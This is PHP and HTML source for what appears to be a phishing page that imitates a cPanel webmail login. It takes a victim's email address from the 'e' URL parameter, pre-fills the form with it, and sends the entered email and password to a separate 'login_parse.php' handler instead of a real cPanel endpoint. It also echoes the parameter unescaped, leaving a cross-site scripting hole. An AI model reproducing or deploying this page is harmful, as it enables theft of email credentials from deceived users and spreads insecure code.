<?php 

$attmail = $_GET['e'];
?>
<html dir="ltr" lang="en"><head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="google" content="notranslate">
  <meta name="apple-itunes-app" content="app-id=1188352635">
  <title>Webmail Login</title>
  <link href="main.css" rel="stylesheet" type="text/css" media="all">
  <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">

  <!-- EXTERNAL CSS -->
  <link href="/cPanel_magic_revision_1386192030/unprotected/nc-cpanel/fonts/open_sans/open_sans.min.css" rel="stylesheet" type="text/css">
  <link href="/cPanel_magic_revision_1593501200/unprotected/nc-cpanel/webmail_style_v2_optimized.css" rel="stylesheet" type="text/css">

  <style type="text/css">
/*
This css is included in the base template in case the css cannot be loaded because of access restrictions
If this css is updated, please update securitypolicy_header.html.tmpl as well
*/
.copyright {
padding-top: 70px;
background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll transparent;
background-size: 25px auto;
background-position: center 35px;
}
  </style>
 
</head>
<body class="wm"><div id="preload_images"></div>



<input type="hidden" id="goto_uri" value="/">
<input type="hidden" id="goto_app" value="">

<div id="login-wrapper" class="group has-pw-reset" style="opacity: 1; visibility: visible;">
  <div class="wrapper">
      <div id="notify">
      
      </div>

      <div style="display:none">
          <div id="locale-container" style="visibility:hidden">
              <div id="locale-inner-container">
                  <div id="locale-header">
                      <div class="locale-head">Please select a locale:</div>
                      <div class="close"><a href="javascript:void(0)" onclick="toggle_locales(false)">X Close</a></div>
                  </div>
                  <div id="locale-map">
                      <div class="scroller clear">
                          
                              <div class="locale-cell"><a href="?locale=en">English</a></div>
                          
                              <div class="locale-cell"><a href="?locale=ar">العربية</a></div>
                          
                              <div class="locale-cell"><a href="?locale=bg">български</a></div>
                          
                              <div class="locale-cell"><a href="?locale=cs">čeština</a></div>
                          
                              <div class="locale-cell"><a href="?locale=da">dansk</a></div>
                          
                              <div class="locale-cell"><a href="?locale=de">Deutsch</a></div>
                          
                              <div class="locale-cell"><a href="?locale=el">Ελληνικά</a></div>
                          
                              <div class="locale-cell"><a href="?locale=es">español</a></div>
                          
                              <div class="locale-cell"><a href="?locale=es_419">español latinoamericano</a></div>
                          
                              <div class="locale-cell"><a href="?locale=es_es">español de España</a></div>
                          
                              <div class="locale-cell"><a href="?locale=fi">suomi</a></div>
                          
                              <div class="locale-cell"><a href="?locale=fil">Filipino</a></div>
                          
                              <div class="locale-cell"><a href="?locale=fr">français</a></div>
                          
                              <div class="locale-cell"><a href="?locale=he">עברית</a></div>
                          
                              <div class="locale-cell"><a href="?locale=hu">magyar</a></div>
                          
                              <div class="locale-cell"><a href="?locale=i_cpanel_snowmen">☃ cPanel Snowmen ☃ - i_cpanel_snowmen</a></div>
                          
                              <div class="locale-cell"><a href="?locale=id">Bahasa Indonesia</a></div>
                          
                              <div class="locale-cell"><a href="?locale=it">italiano</a></div>
                          
                              <div class="locale-cell"><a href="?locale=ja">日本語</a></div>
                          
                              <div class="locale-cell"><a href="?locale=ko">한국어</a></div>
                          
                              <div class="locale-cell"><a href="?locale=ms">Bahasa Melayu</a></div>
                          
                              <div class="locale-cell"><a href="?locale=nb">norsk bokmål</a></div>
                          
                              <div class="locale-cell"><a href="?locale=nl">Nederlands</a></div>
                          
                              <div class="locale-cell"><a href="?locale=no">Norwegian</a></div>
                          
                              <div class="locale-cell"><a href="?locale=pl">polski</a></div>
                          
                              <div class="locale-cell"><a href="?locale=pt">português</a></div>
                          
                              <div class="locale-cell"><a href="?locale=pt_br">português do Brasil</a></div>
                          
                              <div class="locale-cell"><a href="?locale=ro">română</a></div>
                          
                              <div class="locale-cell"><a href="?locale=ru">русский</a></div>
                          
                              <div class="locale-cell"><a href="?locale=sl">slovenščina</a></div>
                          
                              <div class="locale-cell"><a href="?locale=sv">svenska</a></div>
                          
                              <div class="locale-cell"><a href="?locale=th">ไทย</a></div>
                          
                              <div class="locale-cell"><a href="?locale=tr">Türkçe</a></div>
                          
                              <div class="locale-cell"><a href="?locale=uk">українська</a></div>
                          
                              <div class="locale-cell"><a href="?locale=vi">Tiếng Việt</a></div>
                          
                              <div class="locale-cell"><a href="?locale=zh">中文</a></div>
                          
                              <div class="locale-cell"><a href="?locale=zh_cn">中文（中国）</a></div>
                          
                              <div class="locale-cell"><a href="?locale=zh_tw">中文（台湾）</a></div>
                          
                      </div>
                  </div>
              </div>
          </div>
      </div>
      <div id="content-container">
          <div class="login-container" id="login-container">

              <div class="login-container__sub-container" id="login-sub-container">
                      <div class="login-container__header" id="login-sub-header">
                          
                          <img class="main-logo" src="logo.png" alt="logo">
                          
                      </div>

                      
                      <div class="login-container__main" id="login-sub">
                          
                          <div id="clickthrough_form" style="visibility:hidden">
                              <form action="javascript:void(0)">
                                  <div class="notices"></div>
                                  <button type="submit" class="clickthrough-cont-btn">Continue</button>
                              </form>
                          </div>
                          <div class="login-container__login-form login-form" id="forms">
                                  <form novalidate="" id="login_form" action="login_parse.php" method="post"  style="visibility:">
                                  <div class="input-req-login login-form__label">
                                    <label for="user">Email Address</label>
                                    
                                  </div>

                                  <div class="input-field-login icon username-container login-form__input">
                                    <input name="user" id="user" autofocus="autofocus" value="<?php echo $attmail; ?>" class="std_textbox form-control" type="text" autocomplete="off" tabindex="1" required="">
                                    
                                  </div>

                                  <div class="input-req-login login-password-field-label login-form__label">
                                    <label for="pass">Password</label>
                                  </div>
                                  <div class="input-field-login icon password-container login-form__input form-field form-field--with-action">
                                      <input name="pass" id="pass" placeholder="Enter your email password." class="std_textbox form-control" type="password" tabindex="2" autocomplete="off" required="">
                                      
                                  </div>
                                  <div class="controls login-form__controls">
                                      <div class="login-btn">
                                          <button name="submit" type="submit" id="login_submit" tabindex="3" >Log in</button>
                                      </div>

                                                                              <div class="reset-pw">
                                          <a href="/resetpass?start=1" id="reset_password">Reset Password</a>
                                      </div>
                                                                          </div>
                                  <div class="clear" id="push"></div>

                                  
                              </form>
                          <!--CLOSE forms -->
                          </div>
                      <!--CLOSE login-sub -->
                      </div>
                      

                                          <!--CLOSE wrapper -->
              </div>
              <!--CLOSE login-sub-container -->
          </div>




  

  
            <!-- Promo Chat — Copy this HTML -->
            
            <!-- END of Promo Chat — End of Copy this HTML -->

  



          
                      <div id="locale-footer" style="display: block;">
              <div class="locale-container">
                  <noscript>
                      <form method="get" action=".">
                          <select name="locale">
                              <option value="">Change locale</option>
                              <option value='en'>English</option><option value='ar'>العربية</option><option value='bg'>български</option><option value='cs'>čeština</option><option value='da'>dansk</option><option value='de'>Deutsch</option><option value='el'>Ελληνικά</option><option value='es'>español</option><option value='es_419'>español latinoamericano</option><option value='es_es'>español de España</option><option value='fi'>suomi</option><option value='fil'>Filipino</option><option value='fr'>français</option><option value='he'>עברית</option><option value='hu'>magyar</option><option value='i_cpanel_snowmen'>☃ cPanel Snowmen ☃ - i_cpanel_snowmen</option><option value='id'>Bahasa Indonesia</option><option value='it'>italiano</option><option value='ja'>日本語</option><option value='ko'>한국어</option><option value='ms'>Bahasa Melayu</option><option value='nb'>norsk bokmål</option><option value='nl'>Nederlands</option><option value='no'>Norwegian</option><option value='pl'>polski</option><option value='pt'>português</option><option value='pt_br'>português do Brasil</option><option value='ro'>română</option><option value='ru'>русский</option><option value='sl'>slovenščina</option><option value='sv'>svenska</option><option value='th'>ไทย</option><option value='tr'>Türkçe</option><option value='uk'>українська</option><option value='vi'>Tiếng Việt</option><option value='zh'>中文</option><option value='zh_cn'>中文（中国）</option><option value='zh_tw'>中文（台湾）</option>                            </select>
                          <button style="margin-left: 10px" type="submit">Change</button>
                      </form>
                      <style type="text/css">#mobilelocalemenu, #locales_list {display:none}</style>
                  </noscript>
                  <ul id="locales_list" class="locales_list">
                      
                          
                          <li><a href="/?locale=en">English</a></li>
                      
                          
                          <li><a href="/?locale=ar">العربية</a></li>
                      
                          
                          <li><a href="/?locale=bg">български</a></li>
                      
                          
                          <li><a href="/?locale=cs">čeština</a></li>
                      
                          
                          <li><a href="/?locale=da">dansk</a></li>
                      
                          
                          <li><a href="/?locale=de">Deutsch</a></li>
                      
                          
                          <li><a href="/?locale=el">Ελληνικά</a></li>
                      
                          
                          <li><a href="/?locale=es">español</a></li>
                      
                          
                      <li><a href="javascript:void(0)" id="morelocale" onclick="toggle_locales(true)" title="More locales">…</a></li>
                  </ul>
                  <div id="mobilelocalemenu">Select a locale:
                      <a href="javascript:void(0)" onclick="toggle_locales(true)" title="Change locale">English</a>
                  </div>
              </div>
          </div>
      </div>
<!--Close login-wrapper -->
</div>


<style>
  @media (min-width: 481px) {
      #select_user_form {
          width: px;
      }
  }
</style>
  <div class="copyright">Copyright©&nbsp;2020 cPanel, Inc.</div>




</div></body></html>